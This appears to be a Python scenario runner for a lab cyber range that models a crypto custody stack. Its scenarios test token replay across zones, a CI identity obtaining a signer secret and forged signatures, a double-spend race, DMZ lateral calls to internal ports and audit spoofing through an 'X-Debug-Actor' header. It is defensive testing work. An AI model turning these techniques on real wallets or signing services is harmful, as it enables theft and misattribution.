#!/usr/bin/env python3
"""
PRISM / AETHERION Cyber Range — executable scenarios.

Each scenario runs INSIDE a zone namespace (the supervisor launches it with
`nsenter -t <zone-anchor> -n`), so the network path it exercises is the real
one: if the zone has no link, the scenario cannot reach the target at all.

Every scenario returns:
  verdict  : "attack_possible" | "blocked" | "inconclusive"
  steps    : ordered, replayable actions with their observed outcome
  proofs   : artefacts a third party can check (digest, balance, signature,
             chain transaction, HTTP status)
  needs    : limits that apply to the conclusion (cross-referenced to
             docs/cyber-range/08-realism-limits.md)

Usage (inside a zone namespace):
  python3 -m lab.scenarios <scenario-id>
"""
from __future__ import annotations

import concurrent.futures
import json
import os
import sys
import time
import uuid

from .common import SECRETS, STATE, call, db, jwt_decode, totp_now, _read

CFG = os.path.join(STATE, "lab-config.json")


def cfg() -> dict:
    try:
        with open(CFG) as fh:
            return json.load(fh)
    except OSError:
        return {}


def u(name: str) -> str:
    return cfg()["urls"][name]


def secret(name: str) -> str:
    return _read(os.path.join(SECRETS, name))


def token_client(cid: str) -> tuple[str, dict]:
    c = cfg().get("clients", {}).get(cid, {})
    code, r = call(f"{u('idp')}/token", {"grant_type": "client_credentials",
                                          "client_id": cid,
                                          "client_secret": c.get("secret", "")})
    return (r.get("access_token", "") if code == 200 else ""), r


def token_user(user: str) -> tuple[str, dict]:
    seed = secret("totp-" + user).encode()
    code, r = call(f"{u('idp')}/token", {"grant_type": "password", "username": user,
                                          "password": secret("passwd-" + user),
                                          "totp": totp_now(seed), "scope": "transfer:write"})
    return (r.get("access_token", "") if code == 200 else ""), r


def bal(account: str = "acct-hot-1") -> dict:
    code, r = call(f"{u('wallet')}/balance?account={account}")
    return r if code == 200 else {"error": r}


# --------------------------------------------------------------------------- S1
TMP = os.path.join(STATE, "scenario-tmp")


def s1a_mint_and_probe() -> dict:
    """Part A (corp): authenticate, use the token, persist it for part B."""
    steps, proofs = [], []
    tok, meta = token_user("ops1")
    steps.append({"action": "password+TOTP login as ops1", "ok": bool(tok),
                  "claims": jwt_decode(tok) if tok else None})
    if not tok:
        return {"verdict": "inconclusive", "reason": "login failed", "steps": steps}
    code_a, _ = call(f"{u('dmz')}/v1/release", {"release": "probe"}, token=tok,
                     headers={"X-Forwarded-By": "dmz"})
    steps.append({"action": "use token from corp zone", "http": code_a})
    os.makedirs(TMP, exist_ok=True)
    with open(os.path.join(TMP, "s1.token"), "w") as fh:
        fh.write(tok)
    proofs.append({"jti": meta.get("jti"), "ttl_s": meta.get("expires_in"),
                   "corp_http": code_a})
    return {"verdict": "attack_possible" if code_a == 200 else "inconclusive",
            "role": "setup", "steps": steps, "proofs": proofs,
            "needs": ["L-1 (no device binding)", "L-7 (single-actor scale)"]}


def s1b_replay_from_wan() -> dict:
    """Part B (wan): reuse part A's token from a different zone."""
    steps, proofs = [], []
    try:
        tok = open(os.path.join(TMP, "s1.token")).read().strip()
    except OSError:
        return {"verdict": "inconclusive", "reason": "part A did not produce a token"}
    code, _ = call(f"{u('dmz')}/v1/release", {"release": "probe-wan"}, token=tok,
                   headers={"X-Forwarded-By": "dmz"})
    steps.append({"action": "send part A token from the wan zone", "http": code})
    proofs.append({"wan_replay_http": code})
    return {"verdict": "attack_possible" if code == 200 else "blocked",
            "steps": steps, "proofs": proofs,
            "note": ("same bearer token accepted from a second zone -> no origin binding"
                     if code == 200 else "token refused from a second zone")}


# --------------------------------------------------------------------------- S2
def s2_ci_to_signature() -> dict:
    """Over-broad CI scope -> arbitrary signature through an unauthenticated-for-authz proxy."""
    steps, proofs = [], []
    ci_tok, meta = token_client("ci-runner")
    if not ci_tok:
        return {"verdict": "inconclusive", "reason": "no CI token", "steps": steps,
                "clients": list(cfg().get("clients", {}))}
    steps.append({"action": "client_credentials as ci-runner", "scope": meta.get("scope")})

    code, r = call(f"{u('ci')}/pipeline/run", {"branch": "main"}, token=ci_tok, timeout=15)
    steps.append({"action": "run pipeline (real subprocesses)", "http": code,
                  "steps": r.get("steps"), "secret_fetched": r.get("deploy") is not None})
    proofs.append({"pipeline_run": r.get("run")})

    code, sec = call(f"{u('secrets')}/secret/signer-token", token=ci_tok)
    steps.append({"action": "read signer-token with CI scope", "http": code,
                  "secret_returned": bool(sec.get("value"))})
    proofs.append({"secret_lease": sec.get("lease")})

    payload = f"FORGED-TRANSFER:{uuid.uuid4().hex}"
    code, raw = call(f"{u('dmz')}/v1/sign-only", {"key_id": "signer-1",
                                                  "payload": payload}, token=ci_tok)
    sig = raw.get("payload", raw) if isinstance(raw, dict) else {}
    steps.append({"action": "ask gateway /v1/sign-only with CI token", "http": code,
                  "policy_checked": sig.get("policy_checked")})
    if code == 200 and sig.get("signature"):
        proofs.append({"signed_payload": payload,
                       "signature_prefix": sig["signature"][:32],
                       "policy_checked": sig.get("policy_checked")})
        return {"verdict": "attack_possible", "steps": steps, "proofs": proofs,
                "needs": ["L-3 (services written for the lab)",
                          "L-6 (CI simplified)"],
                "note": "an unprivileged CI identity obtained a production signature "
                        "with no policy decision"}
    return {"verdict": "blocked", "steps": steps, "proofs": proofs,
            "note": "signature request refused"}


# --------------------------------------------------------------------------- S3
def s3_wallet_race() -> dict:
    """Concurrent debits both observe the same balance (read-check-write)."""
    steps, proofs = [], []
    started = time.time()
    start = bal()
    steps.append({"action": "read starting balance", "balance": start.get("amount")})
    if "amount" not in start:
        return {"verdict": "inconclusive", "reason": "wallet unreachable", "steps": steps}
    amount = max(1.0, float(start["amount"]) * 0.8)
    tok, _ = token_client("tx-service")

    def one(i: int):
        return call(f"{u('tx')}/internal/transfer",
                    {"account": "acct-hot-1", "asset": "ETH", "amount": amount,
                     "destination": "0xrace", "actor": f"worker{i}"},
                    headers={"X-Gateway": "1"}, timeout=20)

    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex:
        results = list(ex.map(one, [1, 2]))
    steps.append({"action": f"two concurrent debits of {amount}", "results":
                  [{"http": c, "debit": r.get("debit")} for c, r in results]})
    time.sleep(0.4)
    end = bal()
    steps.append({"action": "read final balance", "balance": end.get("amount")})
    code_l, ledger = call(f"{u('wallet')}/ledger?account=acct-hot-1")
    debits = sum(abs(float(e.get("delta", 0))) for e in (ledger.get("ledger") or [])
                 if e.get("account") == "acct-hot-1" and e.get("note") == "debit"
                 and e.get("dest") == "0xrace" and float(e.get("ts", 0)) >= started)
    proofs.append({"start": start.get("amount"), "end": end.get("amount"),
                   "requested_total": 2 * amount, "ledger_debits": debits,
                   "ledger_consistency": abs((start.get("amount", 0) - end.get("amount", 0)) - debits) < 1e-6})
    negative = isinstance(end.get("amount"), (int, float)) and end["amount"] < 0
    both_ok = all(c == 200 for c, _ in results)
    if negative or (both_ok and end.get("amount", 0) < start.get("amount", 0) - amount + 1e-9):
        return {"verdict": "attack_possible", "steps": steps, "proofs": proofs,
                "needs": ["L-3", "L-7"],
                "note": "double spend: two debits accepted against one balance"}
    return {"verdict": "blocked", "steps": steps, "proofs": proofs,
            "note": "second debit rejected"}


# --------------------------------------------------------------------------- S4
def s4_dmz_lateral() -> dict:
    """The DMZ can reach internal service ports directly, bypassing the gateway."""
    steps, proofs = [], []
    from .common import call as c
    code_gw, _ = c(f"{u('gateway')}/health")
    steps.append({"action": "gateway reachable from dmz (expected)", "http": code_gw})
    code_tx, r = c(f"{u('tx')}/internal/transfer",
                   {"account": "acct-hot-1", "asset": "ETH", "amount": 1,
                    "destination": "0xlateral", "actor": "dmz-probe"})
    steps.append({"action": "call internal transaction port directly from dmz",
                  "http": code_tx, "policy_checked": r.get("policy_checked")})
    code_sig, sig = c(f"{u('tx')}/sign-only", {"key_id": "signer-1",
                                               "payload": "LATERAL-" + uuid.uuid4().hex})
    steps.append({"action": "reach sign-only endpoint directly from dmz",
                  "http": code_sig, "signed": bool(sig.get("signature"))})
    proofs.append({"internal_transfer_http": code_tx,
                   "sign_only_http": code_sig})
    if code_tx == 200 or code_sig == 200:
        return {"verdict": "attack_possible", "steps": steps, "proofs": proofs,
                "needs": ["L-3"],
                "note": "no port-level policy between DMZ and prod: only topology"}
    return {"verdict": "blocked", "steps": steps, "proofs": proofs}


# --------------------------------------------------------------------------- S5
def s5a_hsm_unreachable_from_prod() -> dict:
    """Part A (prod): the HSM must be unreachable — enforced by topology."""
    code, r = call(f"{u('hsm')}/health")
    steps = [{"action": "direct HSM request from the prod zone", "http": code,
              "outcome": "unreachable (no route)" if code == 0 else "REACHED"}]
    return {"verdict": "blocked" if code == 0 else "attack_possible",
            "role": "control", "steps": steps, "proofs": [{"prod_to_hsm_http": code}],
            "note": ("HSM has a link only to the signer zone; the kernel drops the packet"
                     if code == 0 else "prod reached the HSM directly: segmentation broken")}


def s5b_hsm_attributes() -> dict:
    """Part B (signer): signing works, key export is refused."""
    steps, proofs = [], []
    code, sig = call(f"{u('hsm')}/sign", {"key_id": "signer-1", "payload": "iso-probe"},
                     headers={"X-HSM-Token": secret("hsm-token")})
    steps.append({"action": "sign via the allowed path", "http": code,
                  "signed": bool(sig.get("signature"))})
    code2, exp = call(f"{u('hsm')}/export", {"key_id": "signer-1"},
                      headers={"X-HSM-Token": secret("hsm-token")})
    steps.append({"action": "attempt key export", "http": code2,
                  "reason": exp.get("reason")})
    proofs.append({"sign_http": code, "export_http": code2,
                   "export_reason": exp.get("reason")})
    ok = code == 200 and code2 == 403
    return {"verdict": "blocked" if ok else "attack_possible",
            "role": "control", "steps": steps, "proofs": proofs,
            "needs": ["L-1 (emulated attributes, not hardware)"],
            "note": ("signature produced, export refused by CKA_EXTRACTABLE=false"
                     if ok else "attribute enforcement failed")}


# --------------------------------------------------------------------------- S6
def s6_actor_spoof() -> dict:
    """UNDISCLOSED: a debug header overrides the authenticated actor."""
    steps, proofs = [], []
    tok, meta = token_user("ops1")
    steps.append({"action": "authenticate as ops1", "ok": bool(tok)})
    conn = db()
    before = conn.execute("SELECT COUNT(*) c FROM transfers").fetchone()["c"]
    conn.close()
    rec = {"account": "acct-hot-1", "asset": "ETH", "amount": 1,
           "destination": "0xdemo-spoof", "actor": "ops1"}
    code, r = call(f"{u('dmz')}/v1/transfer", rec, token=tok,
                   headers={"X-Forwarded-By": "dmz", "X-Debug-Actor": "alice"})
    steps.append({"action": "send transfer with X-Debug-Actor: alice", "http": code})
    conn = db()
    row = conn.execute("SELECT actor FROM transfers ORDER BY ts DESC LIMIT 1").fetchone()
    after = conn.execute("SELECT COUNT(*) c FROM transfers").fetchone()["c"]
    conn.close()
    recorded_actor = row["actor"] if row and after != before else None
    steps.append({"action": "read back recorded actor", "actor": recorded_actor})
    proofs.append({"authenticated_as": "user:ops1", "recorded_actor": recorded_actor,
                   "http": code})
    if recorded_actor == "alice":
        return {"verdict": "attack_possible", "steps": steps, "proofs": proofs,
                "needs": ["L-3"],
                "note": "attribution spoofed: the audit trail names an innocent actor"}
    if code == 200 and recorded_actor == "user:ops1":
        return {"verdict": "blocked", "steps": steps, "proofs": proofs,
                "note": "debug header ignored: the audit trail keeps the real actor"}
    if code in (401, 403):
        return {"verdict": "blocked", "steps": steps, "proofs": proofs,
                "note": "spoofed request refused"}
    return {"verdict": "inconclusive", "steps": steps, "proofs": proofs}


# --------------------------------------------------------------------------- S7
def s7_chain_end_to_end() -> dict:
    """Full path: policy -> wallet -> signer -> HSM -> relayer -> real chain."""
    steps, proofs = [], []
    if not cfg().get("chain_enabled"):
        return {"verdict": "inconclusive", "reason": "chain disabled (anvil not installed)",
                "steps": steps}
    tok, _ = token_client("tx-service")
    dest = cfg().get("chain_to", "")
    conn = db()
    revoked = conn.execute("SELECT COUNT(*) c FROM keys WHERE revoked=1").fetchone()["c"]
    conn.close()
    if revoked:
        steps.append({"action": "precondition", "ok": False,
                      "detail": "a key is revoked; run reset before S7"})
        return {"verdict": "inconclusive", "steps": steps}
    code, r = call(f"{u('tx')}/transfer",
                   {"account": "acct-hot-1", "asset": "ETH", "amount": 1,
                    "destination": dest, "actor": "ops1", "key_id": "signer-1"},
                   headers={"X-Gateway": "1"}, timeout=30)
    steps.append({"action": "policy-checked transfer to the chain", "http": code,
                  "chain": r.get("chain"), "decision": r.get("decision")})
    tx = (r.get("chain") or {}).get("chain_tx")
    proofs.append({"transfer": r.get("transfer"), "chain_tx": tx,
                   "destination": dest})
    if code == 200 and tx:
        rec = {}
        for _ in range(10):
            code2, rr = call(f"{u('chain')}", {"jsonrpc": "2.0", "id": 1,
                                               "method": "eth_getTransactionReceipt",
                                               "params": [tx]}, timeout=10)
            rec = (rr or {}).get("result") or {}
            if rec:
                break
            time.sleep(1)
        steps.append({"action": "read receipt", "status": rec.get("status"),
                      "block": rec.get("blockNumber")})
        proofs.append({"receipt_status": rec.get("status"),
                       "block": rec.get("blockNumber")})
        return {"verdict": "control_ok" if (rec.get("status") == "0x1") else "inconclusive",
                "role": "control", "steps": steps, "proofs": proofs,
                "note": "nominal path works end-to-end (control scenario, not an attack)",
                "kind": "control"}
    return {"verdict": "inconclusive", "steps": steps, "proofs": proofs,
            "reason": "transfer did not reach the chain"}


SCENARIOS = {
    "S1a": ("session_replay_corp", "high", s1a_mint_and_probe),
    "S1b": ("session_replay_wan", "high", s1b_replay_from_wan),
    "S2": ("ci_to_signature", "critical", s2_ci_to_signature),
    "S3": ("wallet_race", "high", s3_wallet_race),
    "S4": ("dmz_lateral", "high", s4_dmz_lateral),
    "S5a": ("hsm_unreachable", "control", s5a_hsm_unreachable_from_prod),
    "S5b": ("hsm_attributes", "control", s5b_hsm_attributes),
    "S6": ("actor_spoof_undisclosed", "high", s6_actor_spoof),
    "S7": ("chain_end_to_end", "control", s7_chain_end_to_end),
}


def main(argv: list[str]) -> int:
    if len(argv) != 2 or argv[1] not in SCENARIOS:
        print(f"usage: python3 -m lab.scenarios {{{'|'.join(SCENARIOS)}}}", flush=True)
        return 2
    sid = argv[1]
    name, severity, fn = SCENARIOS[sid]
    t0 = time.time()
    try:
        res = fn()
    except Exception as exc:                        # noqa: BLE001
        res = {"verdict": "inconclusive", "error": repr(exc)}
    res.update({"id": sid, "name": name, "severity": severity,
                "zone": os.environ.get("RANGE_ZONE", "?"),
                "seconds": round(time.time() - t0, 2),
                "ts": time.time()})
    print("SCENARIO_RESULT " + json.dumps(res, default=str), flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
